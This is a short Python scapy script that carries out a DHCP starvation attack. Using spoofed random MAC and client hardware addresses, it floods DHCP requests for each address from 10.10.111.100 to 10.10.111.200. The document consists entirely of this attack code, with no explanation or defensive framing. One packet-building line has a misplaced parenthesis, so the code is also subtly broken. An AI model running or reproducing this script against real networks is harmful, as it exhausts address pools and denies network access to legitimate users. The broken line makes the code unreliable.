from scapy.all import*
import time

conf.checkIPaddr= False
a=RandMAC()

def RequestIPAddress(ip):
	packet = Ether(src=a, dst= "ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0"), dst="255.255.255.255"/ UDP(sport = 68, dport = 67) / BOOTP(op=1, chaddr=RandString(16, "0123456789abcdef"))/DHCP(options=[("message-type","request"), ("requested_addr", ip), "end"])
	return packet

for i in range (100, 201):
	requestedip="10.10.111.%d" %(i)
	packet = RequestIPAddress(requestedip)
	sendp(packet)
	time.sleep(2)
	